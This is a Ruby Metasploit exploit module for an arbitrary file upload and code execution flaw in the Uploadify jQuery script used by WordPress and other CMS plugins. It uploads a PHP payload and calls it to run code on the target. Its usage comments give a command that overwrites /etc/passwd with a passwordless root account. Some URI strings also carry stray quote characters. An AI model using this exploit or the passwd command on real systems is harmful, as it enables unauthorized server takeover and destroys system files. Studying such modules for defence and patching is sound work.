require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name' => 'Uploadify jQuery Generic File Upload',
'Description' => %q{
This module exploits an arbitrary File Upload and Code Execution flaw Uploadify script
(jQuery Multiple File Upload), the vulnerability allows for arbitrary file upload
and remote code execution POST Data to Vulnerable (uploadify.php) in any CMS/SCRIPT use Uploadify.
},
'Author' => [ 'KedAns-Dz <ked-h[at]1337day.com>' ], # MSF Module
'License' => MSF_LICENSE,
'Version' => '0.1', # Beta Version Just for Pene-Test/Help !
'References' => [
'URL', 'http://1337day.com/related/18686',
'URL', 'http://1337day.com/related/19980'
],
'Privileged' => false,
'Payload' =>
{
'Compat' => { 'ConnectionType' => 'find', },
},
'Platform' => 'php',
'Arch' => ARCH_PHP,
'Targets' => [[ 'Automatic', { }]],
'DisclosureDate' => 'Jun 16 2012',
'DefaultTarget' => 0))
register_options(
[
OptString.new('TARGETURI', [true, "The URI path CMS/Plugin/Module ", "/"]),
OptString.new('PLUGIN', [true, "The Full URI path to Uploadify (jQuery)", "/"]),
OptString.new('UDP', [true, "Full Path After Upload", "/"])
####
# Example (1) in WP Plugin :
# set TARGETURI http://127.0.0.1/wp
# set PLUGIN wp-content/plugins/foxypress/uploadify/uploadify.php
# set UDP wp-content/affiliate_images/
# set RHOST 127.0.0.1
# set PAYLOAD php/exec
# set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
# exploit
####
# Example (2) in JOS Module :
# set TARGETURI http://127.0.0.1/jos
# set PLUGIN modules/pm_advancedsearch4/js/uploadify/uploadify.php?folder=/modules/pm_advancedsearch4/
# set UDP modules/pm_advancedsearch4/
# set RHOST 127.0.0.1
# set PAYLOAD php/exec
# set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
# exploit
####
 
], self.class)
end
def check
uri = datastore['TARGETURI']
plug = datastore['PLUGIN']
res = send_request_cgi({
'method' => 'GET',
'uri' => "#{uri}'/'#{plug}"
})
if res and res.code == 200
return Exploit::CheckCode::Detected
else
return Exploit::CheckCode::Safe
end
end
def exploit
uri = datastore['TARGETURI']
plug = datastore['PLUGIN']
path = datastore['UDP']
peer = "#{rhost}:#{rport}"
post_data = Rex::MIME::Message.new
post_data.add_part("<?php #{payload.encoded} ?>",
"application/octet-stream", nil,
"form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"")
print_status("#{peer} - Sending PHP payload")
res = send_request_cgi({
'method' => 'POST',
'uri' => "#{uri}'/'#{plug}",
'ctype' => 'multipart/form-data; boundary=' + post_data.bound,
'data' => post_data.to_s
})
if not res or res.code != 200 or res.body !~ /\{\"raw_file_name\"\:\"(\w+)\"\,/
print_error("#{peer} - File wasn't uploaded, aborting!")
return
end
print_good("#{peer} - Our payload is at: #{$1}.php! Calling payload...")
res = send_request_cgi({
'method' => 'GET',
'uri' => "#{uri}'/'#{path}'/'#{$1}.php"
})
if res and res.code != 200
print_error("#{peer} - Server returned #{res.code.to_s}")
end
end
end
